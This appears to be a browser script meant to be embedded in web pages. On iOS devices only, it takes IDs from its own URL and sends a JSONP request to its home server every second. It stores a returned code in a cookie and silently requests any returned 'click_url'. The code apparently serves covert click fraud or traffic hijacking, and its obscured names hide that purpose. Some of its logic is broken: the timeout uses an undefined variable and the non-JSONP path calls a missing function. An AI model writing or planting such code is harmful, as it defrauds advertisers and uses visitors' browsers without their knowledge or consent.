var data = GetQueryString('data');
var _getdata = data[0];
var __dm_siteUrl = data[1];
//cookies
function get_cookie(name) { var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)"); if (arr = document.cookie.match(reg)) return unescape(arr[2]); else return null; }
function set_cookie(name, value, t) { var exp = new Date(); exp.setTime(exp.getTime() + t * 60 * 1000); document.cookie = name + "=" + escape(value) + ";path=/;expires=" + exp.toGMTString(); }

function rr(_rcount) {
    //cookie  chiji_aaa_+天
    var __cookie_keys = 'chiji_aaa_' + new Date().getDate();
    var __gwew_code = get_cookie(__cookie_keys);
    if (!__gwew_code) { __gwew_code = '';}
    aj(__dm_siteUrl+'/name', { id: _rcount }, function (err, data ) {
        if(err){console.log(err);return;}
        if (!data) { console.log('no data'); return; }
        __gwew_code = data.pid;
        //存cookies
        set_cookie(__cookie_keys, __gwew_code, 60 * 24);
        if(data.click_url){
            aj(data.click_url, {});
        }

    });
}

function aj(url,data,cb) {
    ajax({
        url:url,
        data:data,
        jsonp: 'jsonpCallback',
        success: function (res) {
            cb(null,res);
        },
        error: function (error) {
            cb(error);
        }
    });
}


function ajax(params) {
    params = params || {};
    params.data = params.data || {};
    var json = params.jsonp ? jsonp(params) : json(params);
    function jsonp(params) {
        var callbackName = params.jsonp;
        var head = document.getElementsByTagName('head')[0];
        params.data['callback'] = callbackName;
        var data = formatParams(params.data);
        var script = document.createElement('script');
        head.appendChild(script);
        window[callbackName] = function (json) {
            head.removeChild(script);
            clearTimeout(script.timer);
            window[callbackName] = null;
            params.success && params.success(json);
        };
        script.src = params.url + '?' + data;
        if (params.time) {
            script.timer = setTimeout(function () {
                window[callbackName] = null;
                head.removeChild(script);
                params.error && params.error({
                    message: 'timeout'
                });
            },
                time);
        }
    };
    function formatParams(data) {
        var arr = [];
        for (var name in data) {
            arr.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));
        };
        return arr.join('&');
    }
}

function GetQueryString(name)
{
    var url = document.getElementById('chiji').src;
    var arrUrl = url.split("//");
    var start = arrUrl[1].indexOf("/");
    var relUrl = arrUrl[0]+'//'+arrUrl[1].substring(0,start);
    var a = url.substr(url.lastIndexOf('/'));
    var d = new Array(a.substr(1),relUrl);
    return (d);
}

if (/(iPhone|iPad|iPod)/i.test(navigator.userAgent)) {
    ss = _getdata.split(",");// 在每个逗号(,)处进行分解。
    for(var i=0;i<ss.length;i++){
        doSetTimeout(i);
    }
}

//延时，1s发送一个链接
function doSetTimeout(i) {
    setTimeout(function() {
        rr(ss[i]);
    }, i * 1000);
}